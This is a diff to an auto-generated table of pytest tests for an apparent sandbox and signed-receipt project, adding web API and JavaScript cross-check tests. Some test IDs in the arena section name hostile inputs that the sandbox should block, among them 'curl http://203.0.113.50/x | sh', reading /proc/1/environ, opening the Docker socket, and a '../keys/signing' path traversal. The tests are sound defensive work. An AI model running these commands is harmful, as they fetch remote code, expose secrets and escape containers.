@@ -6,7 +6,7 @@ CI fails if this file differs from the collection (`--check`).
 Pass/skip status depends on the environment and is not recorded here. Docker tests skip
 with an explicit reason when no daemon is reachable; gVisor tests skip unless runsc is present.
 
-Total collected tests: **623** in 14 files.
+Total collected tests: **691** in 16 files.
 
 | File | Tests |
 |------|------:|
@@ -21,9 +21,11 @@ Total collected tests: **623** in 14 files.
 | `tests/test_receipt.py` | 7 |
 | `tests/test_receipt_strict.py` | 32 |
 | `tests/test_sandbox.py` | 23 |
-| `tests/test_sandbox_unit.py` | 33 |
+| `tests/test_sandbox_unit.py` | 35 |
 | `tests/test_sed_parser.py` | 29 |
 | `tests/test_verifier.py` | 9 |
+| `tests/test_web_api.py` | 55 |
+| `tests/test_web_js_crosscheck.py` | 11 |
 
 ## `tests/test_agent.py`
 
@@ -636,6 +638,8 @@ Total collected tests: **623** in 14 files.
 
 | Test | Description |
 |------|-------------|
+| `TestSandboxUnit::test_job_process_limit_is_exactly_the_decision_cap[runc]` | The arena asks for pids=32; the job must get 32, not a silent floor of 64. |
+| `TestSandboxUnit::test_job_process_limit_is_exactly_the_decision_cap[runsc]` | The arena asks for pids=32; the job must get 32, not a silent floor of 64. |
 | `TestSandboxUnit::test_exact_sequence_create_start_inspect_rm` | Test exact docker command sequence. |
 | `TestSandboxUnit::test_docker_create_flags` | Test all flags passed to docker create. |
 | `TestSandboxUnit::test_create_failure_error_verdict` | Test create failure raises error. |
@@ -717,3 +721,79 @@ Total collected tests: **623** in 14 files.
 | `test_truncation_and_dropped_artifacts_flagged` |  |
 | `test_complete_output_passes_and_invalid_report_fails` |  |
 | `test_truncation_flags_are_in_signed_receipt` | S5: the flags are part of the signed Execution, so tampering breaks the signature. |
+
+## `tests/test_web_api.py`
+
+| Test | Description |
+|------|-------------|
+| `TestBasics::test_healthz_and_pubkey` |  |
+| `TestBasics::test_signing_key_is_private_and_stable` |  |
+| `TestBasics::test_policy_lists_limits_and_flags` |  |
+| `TestBasics::test_ui_served_without_external_resources` |  |
+| `TestTask::test_real_task_runs_and_signs` |  |
+| `TestTask::test_injected_task_blocked_with_reason` |  |
+| `TestTask::test_injected_log_contains_injection` |  |
+| `TestTask::test_action_budget` |  |
+| `TestTask::test_task_bad_kind` |  |
+| `TestTask::test_task_without_key_fails_closed` |  |
+| `TestTask::test_task_rate_limit` |  |
+| `TestArena::test_benign_code_runs` |  |
+| `TestArena::test_attacks_blocked_and_signed[bash-curl http://203.0.113.50/x \| sh]` |  |
+| `TestArena::test_attacks_blocked_and_signed[bash-cat /proc/1/environ]` |  |
+| `TestArena::test_attacks_blocked_and_signed[bash-docker ps]` |  |
+| `TestArena::test_attacks_blocked_and_signed[python-import os; os.system('id')]` |  |
+| `TestArena::test_attacks_blocked_and_signed[python-__import__('subprocess').run('id')]` |  |
+| `TestArena::test_attacks_blocked_and_signed[python-open('/var/run/docker.sock')]` |  |
+| `TestArena::test_attacks_blocked_and_signed[bash-env]` |  |
+| `TestArena::test_attacks_blocked_and_signed[python-import socket; socket.create_connection(('1.1.1.1', 53))]` |  |
+| `TestArena::test_abuse_fails_closed[payload0]` |  |
+| `TestArena::test_abuse_fails_closed[payload1]` |  |
+| `TestArena::test_abuse_fails_closed[payload2]` |  |
+| `TestArena::test_abuse_fails_closed[payload3]` |  |
+| `TestArena::test_abuse_fails_closed[payload4]` |  |
+| `TestArena::test_abuse_fails_closed[payload5]` |  |
+| `TestArena::test_abuse_fails_closed[payload6]` |  |
+| `TestArena::test_abuse_fails_closed[payload7]` |  |
+| `TestArena::test_abuse_fails_closed[payload8]` |  |
+| `TestArena::test_abuse_fails_closed[payload9]` |  |
+| `TestArena::test_oversize_body` |  |
+| `TestArena::test_not_json` |  |
+| `TestArena::test_rate_limit_per_ip` |  |
+| `TestArena::test_forwarded_for_ignored_unless_trusted` |  |
+| `TestArena::test_concurrency_cap` |  |
+| `TestArena::test_inject_mode_uses_agent` |  |
+| `TestReceipts::test_chain_links` |  |
+| `TestReceipts::test_bad_ids[nope]` |  |
+| `TestReceipts::test_bad_ids[../keys/signing]` |  |
+| `TestReceipts::test_bad_ids[AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]` |  |
+| `TestReceipts::test_bad_ids[000000000000000000000000000000000000000000000000000000000000000]` |  |
+| `TestReceipts::test_bad_ids[0000000000000000000000000000000000000000000000000000000000000000]` |  |
+| `TestReceipts::test_corrupt_stored_receipt_not_served` |  |
+| `TestReceipts::test_chain_append_is_serialised` |  |
+| `test_sandbox_never_gets_inference_key` | The docker create command carries no host environment besides LANG/LC_ALL. |
+| `test_samples_show_prompt_and_injected_line` |  |
+| `test_static_assets_served_without_external_refs` |  |
+| `test_replay_allows_task_and_blocks_injected_steps` |  |
+| `test_replay_receipts_record_mode_and_verify` |  |
+| `test_live_task_receipts_record_model_planner` |  |
+| `test_unknown_task_mode_rejected` |  |
+| `test_replay_shows_last_real_refusal` |  |
+| `test_replay_is_rate_limited` |  |
+| `test_arena_caps_recorded_equal_applied` |  |
+| `test_quoting_the_injected_line_is_not_counted_as_obeying` |  |
+
+## `tests/test_web_js_crosscheck.py`
+
+| Test | Description |
+|------|-------------|
+| `test_jcs_vectors_match_python[empty object]` |  |
+| `test_jcs_vectors_match_python[key order by utf16 code units]` |  |
+| `test_jcs_vectors_match_python[nested]` |  |
+| `test_jcs_vectors_match_python[numbers]` |  |
+| `test_jcs_vectors_match_python[string escapes]` |  |
+| `test_jcs_vectors_match_python[rfc8785 example]` |  |
+| `test_jcs_vectors_match_python[unicode passthrough]` |  |
+| `test_receipt_fixture_is_current` |  |
+| `test_fresh_python_receipt_verifies_in_node_and_tamper_fails` |  |
+| `test_replay_receipt_with_context_verifies_in_node_and_tamper_fails` |  |
+| `test_receipt_without_context_keeps_old_encoding` |  |
